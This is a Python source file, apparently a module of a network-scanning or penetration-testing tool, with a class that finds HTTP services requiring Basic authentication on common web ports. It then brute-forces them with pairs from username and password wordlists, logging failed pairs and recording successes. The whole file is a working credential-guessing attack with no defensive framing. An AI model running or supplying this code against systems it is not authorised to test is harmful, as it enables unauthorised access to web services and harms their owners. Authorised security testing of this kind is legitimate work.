import requests
from requests.auth import HTTPBasicAuth
import logging
from mapper import Host

logging.basicConfig(level=logging.INFO, \
    format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class AuthAttacker:
    def __init__(self):
        self.usernames = []
        self.passwords = []

    def read_credentials(self):
        with open('usernames.txt', 'r') as f:
            self.usernames = [line.strip() for line in f.readlines()][:10]
        with open('passwords.txt', 'r') as f:
            self.passwords = [line.strip() for line in f.readlines()][:10]

    def check_basic_auth_required(self, ip, port):
        url = f"http://{ip}:{port}/"
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 401:
                logger.info(f"Basic authentication required for {ip}:{port}.")
                return True
            elif response.status_code == 200:
                logger.info(f"No authentication required for {ip}:{port}.")
                return False
        except requests.ConnectionError:
            logger.error(f"[ERROR] {ip}:{port} - Connection error.")
            return None
        except requests.RequestException as e:
            logger.error(f"[ERROR] {ip}:{port} - {e}")
            return False

    def brute_force_test(self, ip, port):
        if not self.usernames or not self.passwords:
            self.read_credentials()

        url = f"http://{ip}:{port}/"
        for username in self.usernames:
            for password in self.passwords:
                try:
                    response = requests.get(url, auth=HTTPBasicAuth\
                        (username, password), timeout=5)
                    if response.status_code == 200:
                        auth_info = f"Brute force HTTP vulnerability on \
                        port {port}" 
                        logger.info(auth_info)
                        Host.update_auth_info(ip, auth_info)
                        return True
                    elif response.status_code == 401:
                        logger.info(f"[FAILED] {ip}:{port} - \
                            {username}:{password}")
                except requests.RequestException as e:
                    logger.error(f"[ERROR] {ip}:{port} - {e}")
                    return False
        return False

    def start_attack(self, ip, additional_ports):
        common_ports = [80, 443, 8000, 8008, 8080]
        all_ports = common_ports + additional_ports

        for port in all_ports:
            auth_required = self.check_basic_auth_required(ip, port)
            if auth_required is False:
                no_auth_info = f"No HTTP authentication needed on port {port}."
                logger.info(no_auth_info)
                Host.update_auth_info(ip, no_auth_info)
                break
            if auth_required:
                if self.brute_force_test(ip, port):
                    logger.info("Brute force attack successful.")
                    break
                else:
                    logger.info("Brute force attack failed.")
                    continue
        return None